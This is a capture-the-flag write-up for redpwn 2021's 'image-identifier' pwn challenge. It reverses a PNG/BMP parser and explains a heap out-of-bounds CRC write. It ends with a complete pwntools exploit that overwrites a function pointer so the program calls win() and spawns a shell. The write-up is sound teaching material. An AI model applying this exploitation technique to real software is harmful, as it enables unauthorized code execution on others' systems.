# Intro

Heres the second one. 

## Description

![image](https://user-images.githubusercontent.com/73792438/125590627-6d60c007-9e4e-4a5d-9164-49e7fa3828e5.png)

Oddly enough I solved this challenge before `simultaneity`, despite this having less solves overall, probably due to its complexity. The description would suggest some 
sort of image parser (of course the name is `image-identifier`). So lets run it and see.

We are given a `Dockerfile` and a binary, `chal`. No libc this time so no need for any patching shenanigans. If we run `checksec` (like i forgot for `simultaneity`) we 
can see what our options will be:

![image](https://user-images.githubusercontent.com/73792438/125593030-b4bd38d7-8651-4af7-9a87-cb552b662bfc.png)

So PIE is off, and no libc is provided. That combined with having only Partial Relro means that the intended solution probably involves calling/overwriting some function
in the binary/Global Offset Table. If we run the program:

![image](https://user-images.githubusercontent.com/73792438/125593519-98e1de93-afd6-461e-83d1-5c52d68f1a82.png)

We can see it asks for the size of our image file. Upon supplying a size we can then supply our image content. Supplying some junk, predictably does nothing but make the
program complain about `unidentifiable format`, then exits. It seems we won't be able to fully explore the program functionality unless we understand how to make an image
with an identifiable format, so lets crack it open in ghidra.

# Reversing

Thankfully the file isn't stripped (its a pwn challenge, not rev thank god) so we can still maintain some semblence of sanity. So whats in `main()`? Quite alot when 
compared to `simultaneity` (cant take a screenshot bcuz its too big, will just dump the code here):

```c
undefined8 main(void)

{
  int retval;
  long in_FS_OFFSET;
  char yes_no;
  int image_length;
  undefined4 invert_image_colours;
  int img_type;
  void *image_alloc;
  code **image_fops;
  long cookie;
  
  cookie = *(long *)(in_FS_OFFSET + 0x28);
                      /* setup buffering for lil old me awww */
  setbuf(stdout,(char *)0x0);
  setbuf(stdin,(char *)0x0);
  setbuf(stderr,(char *)0x0);
  puts("welcome to the image identifier service\n");
  puts("How large is your file?\n");
  retval = __isoc99_scanf("%d",&image_length);
  if (retval != 1) {
                      /* supposedly 'invalid' file size but doesn't bail out :) */
    puts("invalid file size");
  }
                      /* malloc will return '0' if it fails (aka, size too big). However this doesn't
                         help us, AT ALL. */
  image_alloc = malloc((long)image_length);
  getchar();
  image_fops = (code **)malloc(0x18);
  puts("please send your image here:\n");
  fread(image_alloc,(long)image_length,1,stdin);
                      /* read from the start of our input/image to determine the type of image. From
                         here different fops will be used for each image type. */
  img_type = validateHeader(image_alloc);
                      /* No checks happen on the chunks/footer if we use bmp. Because the functions
                         are basically nops LMFAO. :( just realised my dumbass didn't see that they
                         just exit() immediately. */
  if (img_type == 1) {
    *image_fops = bmpHeadValidate;
    image_fops[1] = bmpChunkValidate;
    image_fops[2] = bmpFooterValidate;
  }
  else {
    if (img_type != 2) {
      puts("unidentifiable format");
                      /* WARNING: Subroutine does not return */
      exit(1);
    }
                      /* However if we have the mis-fortune to use png, there are a myriad of checks
                         and fucky shit we have to do to get a valid file produced. */
    *image_fops = pngHeadValidate;
    image_fops[1] = pngChunkValidate;
    image_fops[2] = pngFooterValidate;
  }
                      /* generates a 256 byte-long sequence */
  make_crc_table();
                      /* ghidra fucked up the args. This will either be bmpHeadValidate() or
                         pngHeadValidate(). */
  retval = (**image_fops)(image_alloc,image_length,image_length,*image_fops);
                      /* if the above is sucessful, we can increment image_alloc by 33 bytes. If our
                         allocation is smaller that that, we can write out of bounds n shit */
  if (retval == 0) {
    puts("valid header, processing chunks");
                      /* Offset can be added to quite a bit, and if your allocation is only 16
                         bytes (minimum) this may be incremented out of bounds, and into the
                         image_fops array... Interesting... */
    image_alloc = (void *)((long)image_alloc + (long)offset);
    invert_image_colours = 0;
    puts("do you want to invert the colors?");
    retval = __isoc99_scanf("%c",&yes_no);
    if ((retval == 1) && (yes_no == 'y')) {
      invert_image_colours = 1;
    }
    while ((ended == 0 && ((long)image_alloc < (long)image_fops))) {
                      /* until there are no chunks left to check. Also check that image_alloc doesn't
                         get incremented out of bounds (but what if it already has been ;) ). */
      image_alloc = (void *)(*image_fops[1])(image_alloc,invert_image_colours,invert_image_colours,
                                                   image_fops[1]);
    }
    (*image_fops[2])(image_alloc);
    puts("congrats this is a great picture");
    if (cookie != *(long *)(in_FS_OFFSET + 0x28)) {
                      /* WARNING: Subroutine does not return */
      __stack_chk_fail();
    }
    return 0;
  }
                      /* WARNING: Subroutine does not return */
  exit(1);
}


```

Lets go though this, step by step. First things first we setup the stack canary, disable buffering, and then we get our size

```c
  puts("welcome to the image identifier service\n");
  puts("How large is your file?\n");
  retval = __isoc99_scanf("%d",&image_length);
  if (retval != 1) {
                      /* supposedly 'invalid' file size but doesn't bail out :) */
    puts("invalid file size");
  }
                      /* malloc will return '0' if it fails (aka, size too big). However this doesn't
                       help us, AT ALL. */
  image_alloc = malloc((long)image_length);
  getchar();
```

And pass it to `malloc((long)image_length)`. This means that we control the allocation size completely with our size. The smallest possible allocation we can supply is 
16 (all chunks are at least this).

Now we get to an interesting part. After our allocation is created, another subsequent allocation is created:

```c
  image_fops = (code **)malloc(0x18);
```

Ghidra rightly identified this as a pointer to a list of pointers. In particular `code`/function pointers. The size request of `0x18` would indicate 3 of these function
pointers, and this is exacty right, as you will see. The position of this allocation being directly after our 'image' allocation will be particularly relevant later, 
props if you can already guess why :).

```c
  puts("please send your image here:\n");
  fread(image_alloc,(long)image_length,1,stdin);
                    /* read from the start of our input/image to determine the type of image. From
                       here different fops will be used for each image type. */
  img_type = validateHeader(image_alloc);
```

Now we can see the familiar dialogue for recieving an image over `stdin`. The program uses `fread()` for this which is pretty cool as regardless of how many badchars
we send (carriage returns, newlines, etc) that would normally terminate a `scanf()` this will read until it has read `(long)image_length` bytes and wont stop until
that point.

We then send our now full input buffer to the function validateHeader.

```c
longlong validateHeader(void *image_alloc)

{
  int memcmp_res;
  longlong image_format;
  
  memcmp_res = memcmp(image_alloc,&bmpHead,2); // if first 2 bytes match bmpHead (0x4D42)
  if (memcmp_res == 0) {
    image_format = 1;
  }
  else {
    memcmp_res = memcmp(image_alloc,&pngHead,8); // or, if the first 8 match pngHead (0x0A1A0A0D474E5089)
    if (memcmp_res == 0) {
      image_format = 2;
    }
    else {
      image_format = 0;
    }
  }
  return image_format;
}

```

This simply compares the the first few bytes of our image to identify the format, comparing 2 header values `bmpHead` and `pngHead`. Whichever matches first will be 
our format, or, if it finds nothing probably an `unidentifiable format`. Coming back into `main()` we can see that this is the case:

```c
  if (img_type == 1) {
    *image_fops = bmpHeadValidate;
    image_fops[1] = bmpChunkValidate;
    image_fops[2] = bmpFooterValidate;
  }
  else {
    if (img_type != 2) {
      puts("unidentifiable format");
                    /* WARNING: Subroutine does not return */
      exit(1);
    }
                    /* However if we have the mis-fortune to use png, there are a myriad of checks
                       and fucky shit we have to do to get a valid file produced. */
    *image_fops = pngHeadValidate;
    image_fops[1] = pngChunkValidate;
    image_fops[2] = pngFooterValidate;
  }
```

You can see the `puts("unidentifiable format")` we got before. You can also see that our `image_fops` array of function pointers is being assigned some values based
on the identified header. If `validateHeader()` though it was a bmp, we get a corresponding set of `Validate` function pointers for that format, same with png. If we
didn't match with any of the identifiable headers we simply exit; the point of this program is to identify images, no point going on if it cannot identify it.

## Crypto pwn, really -_-

Next we do something strange:

```c
                    /* generates a 256 byte-long sequence */
  make_crc_table();
```

And if we then look into this function:

```c
void make_crc_table(void)

{
  uint count_byte;
  uint counter;
  int counter2;
  
                    /* 256 bytes... */
  counter = 0;
  while ((int)counter < 0x100) {
    count_byte = counter & 0xff;
                    /* for each bit of those bytes */
    counter2 = 0;
    while (counter2 < 8) {
      if ((count_byte & 1) == 0) {
        count_byte = count_byte >> 1;
      }
      else {
        count_byte = count_byte >> 1 ^ 0xedb88320;
      }
      counter2 = counter2 + 1;
    }
                    /* write the result to the global var: 'crc_table' */
    *(uint *)(crc_table + (long)(int)counter * 4) = count_byte;
    counter = counter + 1;
  }
  return;
```

Thats fine, my first reaction was "what the fuck?" too. But looking a bit deeper we see all it really does is shift + xor stuff and then assign the result, byte by
byte to the global variable `crc_table` until we have assigned 0x100 bytes of garbage wierdness there. The name `crc_table` may sound familiar, Cyclic redundancy 
check anyone? I'm not a crypto person, so I just looked it up on google

![image](https://user-images.githubusercontent.com/73792438/125604657-55c1f918-3dcc-4dc0-a5bd-6882d26a8559.png)

Don't get too hung up on this, as its only used to 'check' our image header once, and is mostly to attach "check values" to each 'chunk' of our image (look at the 
function names for `*ChunkValidate` function pointers). Specifically `make_crc_table` is responsible for creating a so called `generator polynomial`

`
Specification of a CRC code requires definition of a so-called generator polynomial. 
This polynomial becomes the divisor in a polynomial long division, which takes the 
message as the dividend and in which the quotient is discarded and the remainder becomes the result.
`

You don't need to care about this too much. Just know that this `crc_table` will be used, at some point later, along with some data from our image to generate a 
"check value" for parts of our image which will then be appended to the end of each part.

Thanks [wikipedia](https://en.wikipedia.org/wiki/Cyclic_redundancy_check)

Okay so now we have that insanity out of the way we can move onto more reversing:

## Image and chunk processing

Right after `make_crc_table()`, we call into the first element of our function pointer list

```c
                    /* ghidra fucked up the args. This will either be bmpHeadValidate() or
                       pngHeadValidate(). */
  retval = (**image_fops)(image_alloc,image_length,image_length,*image_fops);
```

The comment basically says it all. So lets clean that up a bit

```c
                    /* ghidra fucked up the args. This will either be bmpHeadValidate() or
                       pngHeadValidate(). */
  retval = (**image_fops)(image_alloc);
```
If we look at the function definition of any of the `*HeadValidate` functions we see they both only take one or 2 args; the `image_alloc` and length. I guess 
because this is more of an indirect call into a list of function pointers ghidra has some trouble identifying what exactly the arguments are, since from ghidra's 
perspective we could call any function. Anyway, lets look at what *could* be called here based on the value of our header, starting with `bmpHeadValidate()`.

```c
void bmpHeadValidate(long image_alloc,uint size)

{
                    /* alot simpler than the checks on the png header; no CRC stuff, just checks 3
                       bytes (?) of the header to verify. */
  if (size != ((int)*(char *)(image_alloc + 6) << 0x18 |
              (int)*(char *)(image_alloc + 4) << 8 | (int)*(char *)(image_alloc + 3) |
              (int)*(char *)(image_alloc + 5) << 0x10)) {
    puts("invalid size!");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  return;
}
```

So this actually takes *2* args, rather than pngHeadValidate which takes only 1. This is effectively just a call to `exit(1)` if you provide an incorrect bmp size, 
which for this bmp format is at byte+3 to 6 (remember the bmp header thingy is only 2 bytes). But if you do provide a correct size we return nothing, so this function
is for all intensive purposes a `nop`. This is the case for all the bmp functions; the others just havent been implemented in the program and just exit when called.
So its fairly clear that we sould focus on the png functions instead:

```c
undefined8 pngHeadValidate(long image_alloc)

{
  uint PNG_header;
  undefined8 bad_header;
  
  if (*(char *)(image_alloc + 0xb) == '\r') {
                    /* if image_alloc+0xb == '\r' we can increment offset by 33 in total :))) */
    offset = offset + 0xc;
                    /* Generate a checksum for the next 0x11 bytes of our file.
                        */
    PNG_header = update_crc(image_alloc + 0xc,0x11);
    offset = offset + 0x15;
    if (PNG_header ==
        ((int)*(char *)(image_alloc + 0x1d) << 0x18 |
        (int)*(char *)(image_alloc + 0x20) & 0xffU |
        ((int)*(char *)(image_alloc + 0x1f) & 0xffU) << 8 |
        ((int)*(char *)(image_alloc + 0x1e) & 0xffU) << 0x10)) {
      bad_header = 0;
    }
    else {
      puts("invalid checksum!");
      bad_header = 1;
    }
  }
  else {
    offset = offset + 8;
    puts("bad header");
    bad_header = 1;
  }
  return bad_header;
}
```

First thing this does is check if there is `'\r'` at `image_alloc+0xb`. If we don't supply this we immediately return with "bad header". However if we do, we increment 
the global variable `offset` by 0xc. `offset` sort of represents where/what position we are at when processing the image. In this case we just checked byte 0xb for 
`'\r'`, so incrementing `offset` by 0xc ensures that we move past that byte into new pastures. 

We then use the `update_crc` function. This is responsible for generating a "check value" for our CRC, based off the contents of `crc_table`, and will generate said
value from `image_alloc+0xc` for 0x11 bytes.

```c
uint update_crc(char *image_alloc,int len)

{
  char *local_20;
  uint local_10;
  int counter;
  
  local_10 = 0xffffffff;
  counter = 0;
  local_20 = image_alloc;
  while (counter < len) {
    local_10 = *(uint *)(crc_table + (ulong)(((int)*local_20 ^ local_10) & 0xff) * 4) ^
               local_10 >> 8;
    local_20 = local_20 + 1;
    counter = counter + 1;
  }
                    /* a really fancy way of 'return 0;', but we sort of control what goes here, a
                       lil bit anyway. */
  return ~local_10;
}
```

Understanding the algorithm is not important, just know that it produces a value that we can (somewhat) control from `image_alloc`, then `not`s it (`~local_10`).
It does this by looking up a value, byte by byte from `crc_table` based on the value of each byte from our input. Recall that `crc_table` is 256 bytes long, thus 
having a value for every possible byte lookup. It then performs some operations that we don't really care about (at least I dont).

```c
    offset = offset + 0x15;
    if (PNG_header ==
        ((int)*(char *)(image_alloc + 0x1d) << 0x18 |
        (int)*(char *)(image_alloc + 0x20) & 0xffU |
        ((int)*(char *)(image_alloc + 0x1f) & 0xffU) << 8 |
        ((int)*(char *)(image_alloc + 0x1e) & 0xffU) << 0x10)) {
      bad_header = 0;
    }
```

Coming back to `pngHeadValidate`, we see that we increment `offset` again by 0x15. Then we compare the bytes returned by `update_crc` with 4 bytes of our input from 
`image_alloc + 0x1d` and if they match, we set `bad_header` to false/0 and then return, if they dont match we return true instead. If we do return 0:

```c
  if (retval == 0) {
    puts("valid header, processing chunks");
                    /* Offset can be added to quite a bit, and if your allocation is only 16
                       bytes (minimum) this may be incremented out of bounds, and into the
                       image_fops array... Interesting... */
    image_alloc = (void *)((long)image_alloc + (long)offset);
    invert_image_colours = 0;
    puts("do you want to invert the colors?");
    retval = __isoc99_scanf("%c",&yes_no);
    if ((retval == 1) && (yes_no == 'y')) {
      invert_image_colours = 1;
    }
```

We now begin "chunk processing". This is the process that I discussed earlier; we dissect an image into chunks, and assign them each a "check field". First however
we increment our `image_alloc` by `offset`. This is used to step over the header and into the 'chunks' of the image. Now we decide wether or not we want to invert
the image colours. This will be very important later, but not for inverting the colour.

Now we finally get to the real meat of this program - where the actual chunk processing happens:

```c
    while ((ended == 0 && ((long)image_alloc < (long)image_fops))) {
                    /* until there are no chunks left to check. Also check that image_alloc doesn't
                       get incremented out of bounds (but what if it already has been ;) ). */
      image_alloc = (void *)(*image_fops[1])(image_alloc,invert_image_colours);
    }
```

This loops through each image chunk, periodically checking that we don't start processing image chunks in the `image_fops` allocation. So what do we do for each chunk
and why would this check be needed. Do we write anything into/after each chunk during processing. Yes :). Here im going to show you the code thats relevant only for 
processing chunks when colour-inversion was enabled, as the rest of it is pretty useless, although of course you can read it if you want.

This `image_fops[1]` will, for us be `pngHeaderValidate` so lets look at that:

```c
  image_4_bytes =
       (int)*(char *)image_alloc << 0x18 |
       (int)*(char *)((long)image_alloc + 3) & 0xffU |
       ((int)*(char *)(image_alloc + 1) & 0xffU) << 8 |
       ((int)*(char *)((long)image_alloc + 1) & 0xffU) << 0x10;
  crc_write_int = image_4_bytes + 4;
  __s1 = image_alloc + 2;
  iVar2 = memcmp(__s1,&end,4);
  if (iVar2 == 0) {
    ended = 1;
  }
```

First things first, we extract 4 bytes from the chunk, then `memcmp`' at those bytes +2 with an `end` value. If this comes out correct, we have reached the marked
end of our image. This means we can stop the chunk loop right here if we stick `end` at the correct place in our image/input. If we are not `ended`, we can go onto
processing our image with colours inverted:

```c
  else {
    if (invert_colours == 1) {
      counter = 0;
      while (counter < image_4_bytes) {
        *(byte *)((long)(image_alloc + 4) + (long)(int)counter) =
             ~*(byte *)((long)(image_alloc + 4) + (long)(int)counter);
        counter = counter + 1;
      }
      check_value = update_crc(image_alloc + 2,crc_write_int,crc_write_int);
      image_alloc = (undefined2 *)((long)(image_alloc + 2) + (ulong)crc_write_int);
                    /* This looks really promising. If we can control what value returns from
                       update_crc we can write whatever we wwant here, potentially an address or some bytes? */
      *image_alloc = check_value;
      image_alloc = image_alloc + 2;
    }
// [---snipped---]
  return image_alloc;
}

```
Now we go through our chunk and 'not'/invert each byte, one at a time using the extracted `image_4_bytes` as the size of our chunk so we know when to stop iterating.
After we do that we call `update_crc` with the controlled value from `image_alloc+2`, then write this `check_value` into our chunk, then incrementing our `image_alloc`
by 2 to move on to the next chunk.

So this function is called in a loop, until we either go beyond `image_alloc` and into `image_fops`, or if we set a special `end` value in one of our chunks, cool.

Finally, we return back into main, then call the last of the function pointers, `pngFooterValidate`, then return:

```c
    (*image_fops[2])(image_alloc);
    puts("congrats this is a great picture");
    if (cookie != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
      __stack_chk_fail();
    }
    return 0;
  }
```

(Im not gonna talk about `pngFooterValidate` as its not particularly relevant either, you'll find out why soon.)
Now that we have a good idea of what the program does + how it does it, we can move on to exploiting the program.

# Exploitation

The bug in particular is here, in `pngChunkValidate`. The `image_4_bytes` variable is extracted from our `image_alloc` and is meant to signify the size of the chunk
(how many bytes to invert/not, in our case). It will iterate over `image_4_bytes` bytes, and doesnt check whether the number extracted is larger than what space we have
in our allocation. We can use this to invert/not bytes outside of our allocation, but this isn't its only use.

```c
  image_4_bytes =
       (int)*(char *)image_alloc << 0x18 |
       (int)*(char *)((long)image_alloc + 3) & 0xffU |
       ((int)*(char *)(image_alloc + 1) & 0xffU) << 8 |
       ((int)*(char *)((long)image_alloc + 1) & 0xffU) << 0x10;
  crc_write_int = image_4_bytes + 4; // This oroginates from the same `image_4_bytes`, just adding 4 tho
// [--snipped--]
  else {
    if (invert_colours == 1) {
      // [--snipped--]
      }
      // src of this update_src is user controlled
      check_value = update_crc(image_alloc + 2,crc_write_int,crc_write_int);
      // add the value to our allocation. Since no checks are done on image_4_bytes, none are done here either
      image_alloc = (undefined2 *)((long)(image_alloc + 2) + (ulong)crc_write_int);
      // we write the check_value at the new image_alloc. This may write waaay our of bounds if the size is right
      *image_alloc = check_value;
```

tldr: we get a controlled write-where with check_value onto the heap, and there is a function pointer that will be called in the adjacent allocation :).

I havent mentioned this until now, but there is a `win()` function in the binary that looks like this:

```c
void win(void)

{
  system("/bin/sh");
  return;
}
```

A desirable target, no? (bear in mind that PIE is also off)

So our goal here is to overwrite `pngFooterValidate` with the `check_value` returned from `update_crc()`. There is a question though. Due to the unpredictable, complex
nature of the `update_crc()` algo, we cannot *directly* influence the output. So how would we find an input that would result in an output from `update_crc()` of the
address of the `win()` function? Well let me show you my exploit:

```python
from pwn import *                                                                                                                    

##Gdb + config stuff
script = '''
b *main+160
b *pngHeadValidate
b *update_crc
b *update_crc+98
b *pngChunkValidate+27
b *pngChunkValidate+160
b *pngHeadValidate+244
b *main+449
continue
'''

## Making the image meta-stuff
# Size of image, but also size of the allocation. This will give us 0x41 regardless tho lel.
img_sz = 0x29
# For passing the first check
pngHead = 0x0a1a0a0d474e5089
# We need this @ index 29 // 0x1d. Since the value at image_alloc+0xc is always the same, we can just see what value it spits out of update_crc
# then input that value as our checksum. This will pass the check every time.
checksum = 0x5ab9bc8a

## Lets make our png.
# Just some stuff to pass initial checks
png = p64(pngHead) + b"\r" * (7)
# Padding until the 29th // 0x1d byte (start of checksum)
png += b"A"*( 0x1d - len(png) )
# This value will be returned from update_crc if you provided 
png += p32(checksum)
# Counter for update_crc will be '\x27', this is enough to write out of our chunk up until the pngFooterValidate function pointer, at which point 
# we write 2 bytes extracted from the return of crc_update.
png += b"\x00"*3 + b"\x27"
# Bruteforced value - ensures that crc_update returns the correct value, such that the last 2 bytes are set to 0x1818 that then is written 
# at the end of the pngFooterValidate function pointer in the adjacent allocation. This function pointer is then called == shell, because these
# are the bottom 2 bytes of win().
png += p32(0xb18)
# Padding so we send the correct num of bytes
png += b"\x00" * (img_sz - len(png))

# Just making sure we still good.
print(len(png))

def main():
    # Connect/start proc
    
    p = process("./chal")
    #p = remote("mc.ax", 31412)
    #gdb.attach(p, script)
    
    print(p.sendlineafter("How large is your file?\n\n", str(img_sz)))
    
    print(p.sendafter("please send your image here:\n\n", png))
    
    # This will trigger the code that allows a 2-byte oob write into the function ptrs. Specifically the
    # last 2 bytes of crc_update() ret get written onto the heap, making it one of the only (semi) user controlled
    # values that can be written our of bounds like this.
    print(p.sendlineafter("do you want to invert the colors?", "y"))
    
    p.interactive()

if __name__ == "__main__":
    main()
```

So initially I construct the image, setting up the checksum and header, etc. The checksum can be obtained as since it is based off of the contents before,
the `update_crc` call will always spit out the same value (unless you change what came before). You an just break at the end of `update_crc()` in gdb and grab that
value, then shove it into the buffer:

![image](https://user-images.githubusercontent.com/73792438/125704171-5c4bcff5-f3cf-4326-a948-62df37f1672c.png)

Then reverse it to reflect how its actually stored in memory:

![image](https://user-images.githubusercontent.com/73792438/125704298-abf79411-efc7-4d16-b6c5-62f37a9f863d.png)

Next we have our `image_4_bytes`. `image_4_bytes+4` or rather `crc_write_int` is the difference, at the time of the write between the location of `pngFooterValidate`
in `image_fops` and our allocation pointer at that time, meaning that when we add that value via 
`image_alloc = (undefined2 *)((long)(image_alloc + 2) + (ulong)crc_write_int);`, `image_alloc` will point directly at `pngFooterValidate` on the heap.

![image](https://user-images.githubusercontent.com/73792438/125705853-b1216700-2057-4773-8a86-34a654be4d56.png)

Next in the exploit we have a mysterious value, 0xb18 and then padding to satisfy the size for `fread()`. So what exactly is this value? Well as you know we want 
directly control the output from `update_crc`, but we do control the input. This value will be passed into `update_crc()`, and make it spit our a value with the last
2 bytes set as 0x1818, and will thus write these 2 bytes into the `pngFooterValidate` function pointer:

Before the write:

![image](https://user-images.githubusercontent.com/73792438/125706290-b85026c8-b56c-4fba-99f6-84fc39b791ee.png)

Aaaand after:

![image](https://user-images.githubusercontent.com/73792438/125706329-37f435a7-bfdc-47c8-8806-fabf6bf92c90.png)

Fairly obvious what happens next; when the function pointer is called we drop directly into a shell. BOOM.

I was able to find the 0xb18 value via a wierd, unreliable fuzzing script that does what our exploit does, but feeds different values into `update_crc` as it goes.
It then waits for a small duration and then `p.poll()`s the connection. If `p.poll()` returned `None` we can guess that it maybe just didn't exit before our arbitrary
timeout, or more likely just didn't exit by itself. And this could be a possible indication of us getting a shell/or some other wierdness happening. You can find that
in this folder. 

Sorry this one was a bit long winded, but I got there eventually. This is my last writeup for redpwn 2021. I'm not gonna bother making writeups for the other 3 I solved
because they were sort of trivial; no one needs a full writeup for those.

HTP


